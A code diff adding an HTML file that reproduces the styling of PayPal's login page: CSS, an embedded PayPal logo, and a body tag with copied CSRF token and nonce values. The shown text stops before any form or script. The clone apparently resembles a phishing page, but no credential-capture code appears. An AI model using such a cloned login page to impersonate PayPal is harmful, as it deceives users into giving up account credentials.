@@ -1,0 +1,1505 @@
+<!DOCTYPE html>
+<style>
+    .legalFooter {
+        display: none;
+    }
+
+    .country-selector {
+        pointer-events: none
+    }
+
+   
+
+    .button {
+        width: 100%;
+        min-height: 44px;
+        padding: 12px 32px;
+        border: 0;
+        display: block;
+        margin-top: 8px;
+        margin-bottom: 8px;
+        background-color: #142c8e;
+        -webkit-box-shadow: none;
+        -moz-box-shadow: none;
+        box-shadow: none;
+        -webkit-border-radius: 4px;
+        -moz-border-radius: 4px;
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box;
+        cursor: pointer;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        -ms-appearance: none;
+        -o-appearance: none;
+        appearance: none;
+        -webkit-tap-highlight-color: transparent;
+        color: #fff;
+        text-align: center;
+        text-shadow: none;
+        text-decoration: none;
+        transition: color .2s ease, background-color .2s ease, border-color .2s ease, box-shadow .2s ease;
+        -webkit-font-smoothing: antialiased
+    }
+
+    a.button:focus,
+    a.button:link:focus,
+    a.button:visited:focus,
+    .button:focus {
+        background-color: #142c8e;
+        border: .1875rem solid #1040c1;
+        outline: 0;
+        box-shadow: 0 0 0 .375rem rgba(16, 114, 235, .16)
+    }
+
+    a.button:hover,
+    a.button:link:hover,
+    a.button:visited:hover,
+    .button:hover {
+        background-color: #1040c1;
+        border-color: #1040c1;
+        outline: 0
+    }
+
+    a.button.active,
+    a.button:link.active,
+    a.button:visited.active,
+    .button.active,
+    a.button:active,
+    a.button:link:active,
+    a.button:visited:active,
+    .button:active {
+        background: #142c8e
+    }
+
+    .button.secondary {
+        background-color: transparent;
+        color: #142c8e;
+        border: .0125rem solid #142c8e;
+        transition: color .2s ease, background-color .2s ease, border-color .2s ease, box-shadow .2s ease
+    }
+
+    a.button.secondary:hover,
+    a.button:link.secondary:hover,
+    a.button:visited.secondary:hover,
+    .button.secondary:hover {
+        background: 0 0;
+        border-color: #142c8e;
+        box-shadow: inset 0 0 0 .0625rem #142c8e;
+        color: #142c8e
+    }
+
+    a.button.secondary:focus,
+    a.button:link.secondary:focus,
+    a.button:visited.secondary:focus,
+    .button.secondary:focus {
+        background: 0 0;
+        border-color: #142c8e;
+        box-shadow: inset 0 0 0 .0625rem #142c8e;
+        color: #142c8e;
+        outline: 0;
+        border: .125rem solid #1072eb;
+        box-shadow: 0 0 0 .25rem rgba(16, 114, 235, .16)
+    }
+
+    .button {
+        font-family: pp-sans-big-regular, Helvetica Neue, Arial, sans-serif;
+        font-weight: 400;
+        font-variant: normal;
+        border-radius: 25px;
+        height: 48px
+    }
+
+    ::-webkit-input-placeholder {
+        font-family: HelveticaNeue, "Helvetica Neue", Helvetica, Arial, sans-serif;
+        color: #6c7378;
+        text-align: left
+    }
+
+    .fieldWrapper {
+        position: relative;
+        z-index: 2;
+        width: 100%
+    }
+
+    .errorMessage {
+        position: absolute;
+        top: 1px;
+        left: 0;
+        z-index: 1;
+        width: 100%;
+        height: 0;
+        opacity: 1;
+        -webkit-border-radius: 0 0 4px 4px;
+        -moz-border-radius: 0 0 4px 4px;
+        border-radius: 0 0 4px 4px;
+        background: #fff;
+        border-top: hidden;
+        transition: all .2s ease-out
+    }
+
+    #splitEmailSection .fieldWrapper #email {
+        border: 0
+    }
+
+    #splitEmailSection .fieldWrapper:hover {
+        transition: border .2s ease-in-out, background-color .2s ease-in-out;
+        border: .0625rem solid #1040c1;
+        border-radius: 4px
+    }
+
+    #splitEmailSection .fieldWrapper {
+        border: .0625rem solid #9da3a6;
+        border-radius: 4px
+    }
+
+    .textInput {
+        position: relative
+    }
+
+    .textInput .fieldWrapper {
+        margin-bottom: 16px
+    }
+
+    .textInput .fieldWrapper:before {
+        content: "";
+        display: block;
+        z-index: -1;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        height: 40px;
+        background-color: #fff;
+        -webkit-border-radius: 5px;
+        -moz-border-radius: 5px;
+        -khtml-border-radius: 5px;
+        border-radius: 5px
+    }
+
+    .textInput .fieldLabel {
+        position: absolute;
+        color: #6c7378;
+        clip: rect(1px, 1px, 1px, 1px);
+        padding: 0;
+        border: 0;
+        height: 1px;
+        width: 1px;
+        overflow: hidden
+    }
+
+    .textInput input {
+        height: 64px;
+        width: 100%;
+        padding: 0 10px;
+        background: #fff;
+        text-overflow: ellipsis;
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box;
+        -webkit-border-radius: 4px;
+        -moz-border-radius: 4px;
+        border-radius: 4px;
+        -webkit-box-shadow: none;
+        -moz-box-shadow: none;
+        box-shadow: none;
+        color: #000;
+        font-family: pp-sans-big-regular, Helvetica Neue, Arial, sans-serif;
+        font-variant: normal;
+        font-weight: 400;
+        direction: ltr
+    }
+
+    .textInput input:focus,
+    .textInput textarea:focus {
+        outline: 0;
+        border: .0625rem solid #1040c1;
+        box-shadow: inset 0 0 0 .125rem #1040c1, 0 0 0 .375rem rgba(16, 114, 235, .16), inset 0 0 0 1px #031954, 0 0 0 1px #1040c1;
+        background-color: #fff
+    }
+
+    .textInput input {
+        padding-top: 20px
+    }
+
+    .textInput input:placeholder-shown {
+        font-size: 18px
+    }
+
+    .textInput input[type=email]::-webkit-input-placeholder {
+        color: transparent
+    }
+
+    .textInput input[type=email]:focus~.fieldLabel,
+    .textInput input[type=email]:not(:focus):valid~.fieldLabel,
+    .textInput input[type=email]:not(:placeholder-shown)~.fieldLabel {
+        top: 8px;
+        bottom: 10px;
+        left: 10px;
+        font-size: 14px;
+        height: 30px;
+        width: 400px;
+        clip: unset;
+        opacity: 1
+    }
+
+    .textInput [for=email].fieldLabel {
+        position: absolute;
+        pointer-events: none;
+        left: 10px;
+        top: 18px;
+        transition: .2s ease all;
+        height: 30px;
+        width: 400px;
+        clip: unset
+    }
+
+    .textInput input[type=password]::-webkit-input-placeholder {
+        color: transparent
+    }
+
+    .textInput input[type=password]:focus~.fieldLabel,
+    .textInput input[type=password]:not(:focus):valid~.fieldLabel,
+    .textInput input[type=password]:not(:placeholder-shown)~.fieldLabel {
+        top: 8px;
+        bottom: 10px;
+        left: 10px;
+        font-size: 14px;
+        height: 30px;
+        width: 400px;
+        clip: unset;
+        opacity: 1
+    }
+
+    .textInput [for=password].fieldLabel {
+        position: absolute;
+        pointer-events: none;
+        left: 10px;
+        top: 18px;
+        transition: .2s ease all;
+        height: 30px;
+        width: 400px;
+        clip: unset
+    }
+
+    .textInput input:not([type=submit]):not([type=radio]):not([type=checkbox]) {
+        -webkit-background-clip: padding-box;
+        -moz-background-clip: padding-box;
+        background-clip: padding-box;
+        -webkit-transition: border .2s ease-in-out, background-color .2s ease-in-out;
+        -moz-transition: border .2s ease-in-out, background-color .2s ease-in-out;
+        -o-transition: border .2s ease-in-out, background-color .2s ease-in-out;
+        transition: border .2s ease-in-out, background-color .2s ease-in-out
+    }
+
+    #passwordSection label:not([for=password]):not([for=email]) {
+        color: transparent;
+        pointer-events: none
+    }
+
+    #passwordSection label:not([for=password]):not([for=email]) {
+        color: transparent
+    }
+
+    #email {
+        padding-top: 20px
+    }
+
+    .notifications {
+        outline: 0;
+        margin-bottom: 10px;
+        font-size: 13px
+    }
+
+    .footer {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        font-size: 11px;
+        padding-top: 14px
+    }
+
+    .footer .legalFooter {
+        text-align: center;
+        padding: 14px;
+        background-color: #F7F9FA
+    }
+
+    .footer .legalFooter a,
+    .footer .legalFooter a:link,
+    .footer .legalFooter a:visited,
+    .footer .legalFooter a:hover {
+        color: #666;
+        white-space: nowrap
+    }
+
+    .intentFooter {
+        position: relative;
+        display: block;
+        font-size: 12px;
+        margin-top: 72px
+    }
+
+    .intentFooter .cancelUrl {
+        text-align: center;
+        display: block;
+        width: 100%
+    }
+
+    .intentFooter .localeSelector {
+        text-align: center;
+        display: block;
+        width: 100%;
+        padding-top: 16px
+    }
+
+    .intentFooter .localeSelector a,
+    .intentFooter .localeSelector a:link,
+    .intentFooter .localeSelector a:visited,
+    .intentFooter .localeSelector a:hover {
+        color: #666;
+        white-space: nowrap
+    }
+
+    .intentFooter .localeSelector a.selected {
+        color: #666;
+        font-weight: 700
+    }
+
+    .intentFooter .localeSelector .localeLink {
+        margin: 0;
+        list-style: none;
+        display: inline-block
+    }
+
+    .intentFooter .localeSelector .localeLink li {
+        padding: 0 6px;
+        display: inline-block;
+        border-left: 1px solid #ccc
+    }
+
+    .intentFooter .localeSelector .localeLink li:first-child {
+        padding-left: 0;
+        border-left: 0
+    }
+
+    .footerGroup {
+        list-style-type: none;
+        text-align: center
+    }
+
+    .footerGroup li {
+        display: inline-block;
+        margin: 0 10px 0 0
+    }
+
+    .footerGroup li a,
+    .footerGroup li a:link,
+    .footerGroup li a:visited,
+    .footerGroup li a:hover {
+        color: #666;
+        white-space: nowrap
+    }
+
+    .footerGroup li:last-child {
+        margin: 0
+    }
+
+    @media all and (max-width:767px) {
+        .intentFooter {
+            margin-bottom: 20px
+        }
+    }
+
+    @keyframes rotation {
+        from {
+            transform: rotate(0deg)
+        }
+
+        to {
+            transform: rotate(359deg)
+        }
+    }
+
+    @-webkit-keyframes rotation {
+        from {
+            -webkit-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+
+        to {
+            -webkit-transform: rotate(359deg);
+            transform: rotate(359deg)
+        }
+    }
+
+    @-moz-keyframes rotation {
+        from {
+            -moz-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+
+        to {
+            -moz-transform: rotate(359deg);
+            transform: rotate(359deg)
+        }
+    }
+
+    @-o-keyframes rotation {
+        from {
+            -o-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+
+        to {
+            -o-transform: rotate(359deg);
+            transform: rotate(359deg)
+        }
+    }
+
+    html {
+        background-color: #fff;
+        min-height: 100%
+    }
+
+    body {
+        min-height: 100%;
+        margin: 0;
+        padding: 0;
+        color: #2c2e2f;
+        font-family: pp-sans-big-regular, Helvetica Neue, Arial, sans-serif;
+        font-weight: 400;
+        font-variant: normal;
+        font-size: 112.5%;
+        -webkit-font-smoothing: antialiased;
+        -webkit-backface-visibility: hidden;
+        -moz-text-size-adjust: 112.5%;
+        -ms-text-size-adjust: 112.5%;
+        -webkit-text-size-adjust: 112.5%
+    }
+
+    ul,
+    li {
+        margin: 0;
+        padding: 0
+    }
+
+    p {
+        color: #2c2e2f
+    }
+
+    h1 {
+        margin: 0;
+        color: #2c2e2f
+    }
+
+    a,
+    a:link,
+    a:visited {
+        color: #1072eb;
+        font-family: pp-sans-big-medium, Helvetica Neue, Arial, sans-serif;
+        font-variant: normal;
+        font-weight: 400;
+        text-decoration: none;
+        -webkit-transition: color .2s ease-out;
+        -moz-transition: color .2s ease-out;
+        -o-transition: color .2s ease-out;
+        transition: color .2s ease-out
+    }
+
+    a:hover,
+    a:focus {
+        text-decoration: underline;
+        outline: 0
+    }
+
+    p,
+    div,
+    span,
+    a,
+    label {
+        font-family: pp-sans-big-regular, Helvetica Neue, Arial, sans-serif;
+        font-weight: 400;
+        font-variant: normal
+    }
+
+    .clearfix {
+        zoom: 1
+    }
+
+    .clearfix:before,
+    .clearfix:after {
+        display: table;
+        content: ""
+    }
+
+    .clearfix:after {
+        clear: both
+    }
+
+    * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box
+    }
+
+    .paypal-logo {
+        margin: 0 auto 6.56%;
+        text-indent: 100%;
+        overflow: hidden;
+        white-space: nowrap
+    }
+
+    .paypal-logo-long {
+        background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCA0OCA0OCI+CiAgPHBhdGggZmlsbD0iIzAwMUM2NCIgZD0iTTM3Ljk3MiAxMy44MmMuMTA3LTUuNTY1LTQuNDg1LTkuODM3LTEwLjc5OS05LjgzN0gxNC4xMTVhMS4yNzggMS4yNzggMCAwIDAtMS4yNjIgMS4wNzlMNy42MiAzNy43NThhMS4wMzggMS4wMzggMCAwIDAgMS4wMjUgMS4yaDcuNzM3bC0xLjIxIDcuNTcyYTEuMDM4IDEuMDM4IDAgMCAwIDEuMDI2IDEuMkgyMi41Yy4zMDUgMCAuNTc2LS4xMS44MDctLjMwNy4yMzEtLjE5OC4yNjktLjQ3MS4zMTYtLjc3MmwxLjg1LTEwLjg4NWMuMDQ3LS4zLjItLjY5LjQzMi0uODg4LjIzMS0uMTk4LjQzMy0uMzA2LjczNy0uMzA3SDMwLjVjNi4xODMgMCAxMS40My00LjM5NCAxMi4zODktMTAuNTA3LjY3OC00LjM0LTEuMTgyLTguMjg3LTQuOTE2LTEwLjI0NFoiLz4KICA8cGF0aCBmaWxsPSIjMDA3MEUwIiBkPSJtMTguMDU2IDI2LjktMS45MjcgMTIuMjItMS4yMSA3LjY2NGExLjAzOCAxLjAzOCAwIDAgMCAxLjAyNiAxLjJoNi42N2ExLjI3OCAxLjI3OCAwIDAgMCAxLjI2MS0xLjA3OWwxLjc1OC0xMS4xNGExLjI3NyAxLjI3NyAwIDAgMSAxLjI2MS0xLjA3OGgzLjkyN2M2LjE4MyAwIDExLjQyOS00LjUxIDEyLjM4OC0xMC42MjMuNjgtNC4zMzktMS41MDQtOC4yODYtNS4yMzgtMTAuMjQ0LS4wMS40NjItLjA1LjkyMy0uMTIxIDEuMzgtLjk1OSA2LjExMi02LjIwNiAxMC42MjMtMTIuMzg5IDEwLjYyM2gtNi4xNDVhMS4yNzcgMS4yNzcgMCAwIDAtMS4yNjEgMS4wNzdaIi8+CiAgPHBhdGggZmlsbD0iIzAwMzA4NyIgZD0iTTE2LjEyOCAzOS4xMmgtNy43NmExLjAzNyAxLjAzNyAwIDAgMS0xLjAyNS0xLjJsNS4yMzItMzMuMTgyYTEuMjc3IDEuMjc3IDAgMCAxIDEuMjYyLTEuMDc4aDEzLjMzN2M2LjMxMyAwIDEwLjkwNSA0LjU5NSAxMC43OTggMTAuMTYtMS41NzEtLjgyNC0zLjQxNy0xLjI5NS01LjQ0LTEuMjk1SDIxLjQxM2ExLjI3OCAxLjI3OCAwIDAgMC0xLjI2MSAxLjA3OEwxOC4wNTcgMjYuOWwtMS45MyAxMi4yMloiLz4KPC9zdmc+Cg==)top center no-repeat;
+        width: 34px;
+        height: 40px;
+        display: block
+    }
+
+    .contentContainer {
+        position: relative;
+        -webkit-border-radius: 12px;
+        -moz-border-radius: 12px;
+        border-radius: 12px
+    }
+
+    .contentContainerBordered {
+        margin: 120px auto 0;
+        padding: 30px 10% 50px;
+        border: 1px solid #eaeced;
+        overflow: hidden
+    }
+
+    .corral {
+        margin: 0 auto;
+        width: 460px;
+        position: relative
+    }
+
+    .headerText {
+        padding-bottom: 4.72%;
+        text-align: center;
+        font-family: pp-sans-big-regular, Helvetica Neue, Arial, sans-serif;
+        font-weight: 400;
+        font-variant: normal
+    }
+
+    .subHeaderText {
+        margin: 0 0 7.08%;
+        color: #2c2e2f;
+        text-align: center
+    }
+
+    @media all and (max-width:767px) {
+        .contentContainerBordered {
+            border: 0;
+            margin: 0 auto
+        }
+
+        .contentContainer {
+            padding: 4.8%;
+            width: 100%;
+            background-color: #fff
+        }
+
+        .corral {
+            width: 100%
+        }
+
+        .headerText {
+            padding-bottom: 16px
+        }
+
+        .paypal-logo {
+            margin: 0 auto 7.08%
+        }
+    }
+
+    /*! @noflip */
+    /*! Fix for Scrolling in Popup */
+    /*! Code for notification Alert */
+    /*! Code for success Alert */
+    [id=login] [class=corral] .localeSelector .localeLink {
+        font-size: 11px
+    }
+
+    [id=login] [class=corral] #content .intentFooter .cancelUrl {
+        font-size: 12.8px
+    }
+
+    [id=login] [class=corral] .textInSeparator {
+        font-size: 14px
+    }
+
+    [id=login] [class=corral] #pwdSubTagLine,
+    [id=login] [class=corral] #password,
+    [id=login] [class=corral] #forgotPassword,
+    [id=login] [class=corral] #email {
+        font-size: 15px
+    }
+
+    [id=login] [class=corral] #createAccount,
+    [id=login] [class=corral] #btnLogin {
+        font-size: 16px
+    }
+
+    [id=login] [class=corral] #content #headerText {
+        font-size: 24px
+    }
+
+    @keyframes toast-fadein {
+        0% {
+            transform: translate(-50%, -2rem);
+            opacity: 0
+        }
+
+        100% {
+            visibility: visible;
+            transform: translate(-50%, 0);
+            opacity: 1
+        }
+    }
+
+    @keyframes toast-fadeout {
+        0% {
+            visibility: visible;
+            transform: translate(-50%, 0);
+            opacity: 1
+        }
+
+        100% {
+            visibility: hidden;
+            transform: translate(-50%, -2rem);
+            opacity: 0
+        }
+    }
+
+    .maskable {
+        position: relative
+    }
+
+    * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box
+    }
+
+    #passwordSection.showHideButtonForEligibleBrowser .textInput .fieldWrapper {
+        display: flex;
+        border: 1px solid #9da3a6;
+        -webkit-border-radius: 4px;
+        -moz-border-radius: 4px;
+        border-radius: 4px
+    }
+
+    #passwordSection.showHideButtonForEligibleBrowser .textInput .fieldWrapper:hover,
+    #passwordSection.showHideButtonForEligibleBrowser .textInput .fieldWrapper:active {
+        transition: border .2s ease-in-out, background-color .2s ease-in-out;
+        border: .0625rem solid #1040c1
+    }
+
+    #passwordSection.showHideButtonForEligibleBrowser .textInput input {
+        border: 0
+    }
+
+    .loginSignUpSeparator {
+        border-top: 1px solid #cbd2d6;
+        position: relative;
+        margin-top: 8.72%;
+        margin-bottom: 4.895%;
+        height: 15px;
+        text-align: center;
+        font-size: 83.34%
+    }
+
+    .loginSignUpSeparator .textInSeparator {
+        background-color: #fff;
+        padding: 0 .5em;
+        position: relative;
+        color: #6c7378;
+        top: -.7em
+    }
+
+    .recoveryOption {
+        position: relative;
+        margin-top: 0
+    }
+
+    .forgotPassword {
+        display: inline-block;
+        margin: 0 0 16px
+    }
+
+    @-webkit-keyframes slide-down {
+        0% {
+            opacity: 0;
+            -webkit-transform: translateY(-100%)
+        }
+
+        100% {
+            opacity: 1;
+            -webkit-transform: translateY(0)
+        }
+    }
+
+    @-moz-keyframes slide-down {
+        0% {
+            opacity: 0;
+            -moz-transform: translateY(-100%)
+        }
+
+        100% {
+            opacity: 1;
+            -moz-transform: translateY(0)
+        }
+    }
+
+    /*! @noflip */
+    .signupContainer {
+        text-align: center
+    }
+
+    @keyframes slideIn {
+        from {
+            bottom: -330px
+        }
+
+        to {
+            bottom: 0
+        }
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @keyframes slideOut {
+        from {
+            bottom: 0
+        }
+
+        to {
+            bottom: -330px
+        }
+    }
+
+    @keyframes fadeOut {
+        from {
+            opacity: 1
+        }
+
+        to {
+            opacity: 0
+        }
+    }
+
+    @keyframes slideIn {
+        from {
+            bottom: -330px
+        }
+
+        to {
+            bottom: 0
+        }
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @keyframes slideOut {
+        from {
+            bottom: 0
+        }
+
+        to {
+            bottom: -330px
+        }
+    }
+
+    @keyframes fadeOut {
+        from {
+            opacity: 1
+        }
+
+        to {
+            opacity: 0
+        }
+    }
+</style>
+<!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/af5/2a5d27b7635fa0fd50177ace2ef5f/css/ie9.css" /><![endif]-->
+<style>
+    /*!
+ * Waves v0.7.5
+ * http://fian.my.id/Waves
+ * 
+ * Copyright 2014-2016 Alfiana E. Sibuea and other contributors
+ * Released under the MIT license
+ * https://github.com/fians/Waves/blob/master/LICENSE
+ */
+    @-webkit-keyframes srFadeInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translateY(100px);
+            transform: translateY(100px)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateY(0);
+            transform: translateY(0)
+        }
+    }
+
+    @keyframes srFadeInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translateY(100px);
+            transform: translateY(100px)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateY(0);
+            transform: translateY(0)
+        }
+    }
+
+    @-webkit-keyframes srFadeInDown {
+        0% {
+            opacity: 1;
+            -webkit-transform: translateY(0);
+            transform: translateY(0)
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translateY(100px);
+            transform: translateY(100px)
+        }
+    }
+
+    @keyframes srFadeInDown {
+        0% {
+            opacity: 1;
+            -webkit-transform: translateY(0);
+            transform: translateY(0)
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translateY(100px);
+            transform: translateY(100px)
+        }
+    }
+
+    @-webkit-keyframes fadeOutUp {
+        0% {
+            opacity: 1
+        }
+
+        to {
+            margin-top: 0;
+            padding: 0;
+            height: 0;
+            min-height: 0;
+            opacity: 0;
+            -webkit-transform: scaleY(0);
+            transform: scaleY(0)
+        }
+    }
+
+    @keyframes fadeOutUp {
+        0% {
+            opacity: 1
+        }
+
+        to {
+            margin-top: 0;
+            padding: 0;
+            height: 0;
+            min-height: 0;
+            opacity: 0;
+            -webkit-transform: scaleY(0);
+            transform: scaleY(0)
+        }
+    }
+
+    :root {
+        --sr-annote-color-0: #b4d9fb;
+        --sr-annote-color-1: #ffeb3b;
+        --sr-annote-color-2: #a2e9f2;
+        --sr-annote-color-3: #a1e0ff;
+        --sr-annote-color-4: #a8ea68;
+        --sr-annote-color-5: #ffb7da
+    }
+
+    @-webkit-keyframes sr-annote-slideInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0);
+            visibility: visible
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes sr-annote-slideInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0);
+            visibility: visible
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+    }
+
+    @-webkit-keyframes sr-annote-slideInDown {
+        0% {
+            opacity: 1;
+            visibility: visible
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+    }
+
+    @keyframes sr-annote-slideInDown {
+        0% {
+            opacity: 1;
+            visibility: visible
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+    }
+
+    @-webkit-keyframes fadeInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes fadeInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+    }
+
+    @-webkit-keyframes fadeOutDown {
+        0% {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+    }
+
+    @keyframes fadeOutDown {
+        0% {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+    }
+
+    @-webkit-keyframes scaleAnimation {
+        0% {
+            opacity: 0;
+            -webkit-transform: scale(1.5);
+            transform: scale(1.5)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: scale(1);
+            transform: scale(1)
+        }
+    }
+
+    @keyframes scaleAnimation {
+        0% {
+            opacity: 0;
+            -webkit-transform: scale(1.5);
+            transform: scale(1.5)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: scale(1);
+            transform: scale(1)
+        }
+    }
+
+    @-webkit-keyframes fadeOut {
+        0% {
+            opacity: 1
+        }
+
+        to {
+            opacity: 0
+        }
+    }
+
+    @keyframes fadeOut {
+        0% {
+            opacity: 1
+        }
+
+        to {
+            opacity: 0
+        }
+    }
+
+    @-webkit-keyframes fadeIn {
+        0% {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @keyframes fadeIn {
+        0% {
+            opacity: 0
+        }
+
+        to {
+            opacity: 1
+        }
+    }
+
+    @-webkit-keyframes swing {
+        20% {
+            -webkit-transform: rotate(15deg);
+            transform: rotate(15deg)
+        }
+
+        40% {
+            -webkit-transform: rotate(-10deg);
+            transform: rotate(-10deg)
+        }
+
+        60% {
+            -webkit-transform: rotate(5deg);
+            transform: rotate(5deg)
+        }
+
+        80% {
+            -webkit-transform: rotate(-5deg);
+            transform: rotate(-5deg)
+        }
+
+        to {
+            -webkit-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+    }
+
+    @keyframes swing {
+        20% {
+            -webkit-transform: rotate(15deg);
+            transform: rotate(15deg)
+        }
+
+        40% {
+            -webkit-transform: rotate(-10deg);
+            transform: rotate(-10deg)
+        }
+
+        60% {
+            -webkit-transform: rotate(5deg);
+            transform: rotate(5deg)
+        }
+
+        80% {
+            -webkit-transform: rotate(-5deg);
+            transform: rotate(-5deg)
+        }
+
+        to {
+            -webkit-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+    }
+
+    @-webkit-keyframes fadeInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes fadeInUp {
+        0% {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+
+        to {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+    }
+
+    @-webkit-keyframes fadeOutDown {
+        0% {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+    }
+
+    @keyframes fadeOutDown {
+        0% {
+            opacity: 1;
+            -webkit-transform: translateZ(0);
+            transform: translateZ(0)
+        }
+
+        to {
+            opacity: 0;
+            -webkit-transform: translate3d(0, 100%, 0);
+            transform: translate3d(0, 100%, 0)
+        }
+    }
+
+    @-webkit-keyframes rotation {
+        from {
+            -webkit-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+
+        to {
+            -webkit-transform: rotate(359deg);
+            transform: rotate(359deg)
+        }
+    }
+
+    @-moz-keyframes rotation {
+        from {
+            -moz-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+
+        to {
+            -moz-transform: rotate(359deg);
+            transform: rotate(359deg)
+        }
+    }
+
+    @-o-keyframes rotation {
+        from {
+            -o-transform: rotate(0deg);
+            transform: rotate(0deg)
+        }
+
+        to {
+            -o-transform: rotate(359deg);
+            transform: rotate(359deg)
+        }
+    }
+
+    @keyframes rotation {
+        from {
+            transform: rotate(0deg)
+        }
+
+        to {
+            transform: rotate(359deg)
+        }
+    }
+
+
+
+    .country-selector .C2 {
+        background-position: 5px -5144px
+    }
+
+    .picker.country-selector {
+        display: inline-block;
+        vertical-align: middle;
+        position: relative
+    }
+
+    .picker.country-selector button {
+        display: inline-block;
+        margin-right: 30px;
+        cursor: pointer
+    }
+
+    .picker.country-selector button::after {
+        content: "";
+        position: absolute;
+        bottom: 10px;
+        height: 8px;
+        width: 8px;
+        left: 30px;
+        margin: 8px 0 0 8px;
+        border-color: #333;
+        border-image: none;
+        border-style: solid;
+        border-width: 1px 1px 0 0;
+        -webkit-transform: rotate(135deg);
+        -moz-transform: rotate(135deg);
+        -o-transform: rotate(135deg);
+        -ms-transform: rotate(135deg);
+        transform: rotate(135deg)
+    }
+</style>
+
+<style>
+    .sf-hidden {
+        display: none !important
+    }
+</style>
+<meta http-equiv=content-security-policy
+    content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
+<style>
+    img[src="data:,"],
+    source[src="data:,"] {
+        display: none !important
+    }
+</style>
+
+<body class=desktop
+    data-rlogid=rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVpgPHQO3DS15Q%2Bs90pd04ixT6NDYUDsja0QCiKo7iES_18451e3145e
+    data-hostname=rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0biQlNiCHKWWofITjyrTvoI+EBckvB7Ji data-production=true
+    data-enable-ads-captcha=true data-ads-challenge-url=/auth/createchallenge/6e89663cb127a925/challenge.js
+    data-enable-client-cal-logging=true data-correlation-id=f25341283b796 data-enable-fn-beacon-on-web-views=true
+    data-phone-password-enabled=true data-is-hybrid-login-experience=true data-is-hybrid-editable-on-cookied=true
+    data-phone-code="CN +86" data-csrf-token="qgleaeA0qSVPNXp7obYAqFVYr0bhQedEsM7z8="
+    data-nonce=3j8+cEqym0/Rm8UUz4DaPFrVi3d7qdxIgDcmTSZPMhxSK5b1 data-lazy-load-country-codes=true
+    data-party-id-hash=4142e450474c43e2947df0a105aa78a7ea78983a893f6aef14683ddcd0531981 data-show-country-drop-down=true
